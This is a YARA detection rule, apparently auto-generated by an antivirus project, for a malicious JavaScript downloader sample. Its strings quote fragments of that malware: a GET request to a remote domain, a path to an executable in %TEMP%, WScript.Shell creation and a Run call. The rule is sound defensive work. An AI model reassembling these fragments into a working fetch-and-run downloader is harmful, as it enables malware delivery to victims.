rule sig_20160329_b677330b876dff543ccb883dbf23637d {
  meta:
    description = "datamaliciousorder - file 20160329_b677330b876dff543ccb883dbf23637d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "05d9c2b3b0bd14a0dc9d5e9c456598f08dde4c413e0150d9e46f850d753d8d77"

  strings:
    $s1  = "Ob[GN](\"GET\", \"http://pasticceriabonci.com/n4usj\", false);" fullword ascii
    $s2  = "function b() {return Md[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"n1M919BR6mlc.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[iD](bp() * 11); if (Ob[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function GB(v, xd){B = B * 1; return v - xd;};" fullword ascii
    $s5  = "var Md = function nS() {return WScript[X](\"WScript.Shell\");}(), Ig = 11;" fullword ascii
    $s6  = "function R(){return \"\" + jS;};" fullword ascii
    $s7  = "function mo() {return ((mH == true) && (mH == G)) ? 1 : B;};" fullword ascii
    $s8  = "function Mv(x){Md[\"Run\"](x, B, B);};" fullword ascii
    $s9  = " while (P){" fullword ascii
    $s10 = "function Z(){return X;};" fullword ascii
    $s11 = "return GB(tf, Vf);" fullword ascii
    $s12 = "function Nc()" fullword ascii
    $s13 = "var DP = new this[\"Date\"]();" fullword ascii
    $s14 = "function CX(Y) {var j = (1, 2, 3, 4, 5, Y); return j;};" fullword ascii
    $s15 = "function bp(){return 22;};" fullword ascii
    $s16 = "var G = false;" fullword ascii
    $s17 = "G = true; " fullword ascii
    $s18 = "var mH = false;" fullword ascii
    $s19 = "mH = true; " fullword ascii
    $s20 = "var DT = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}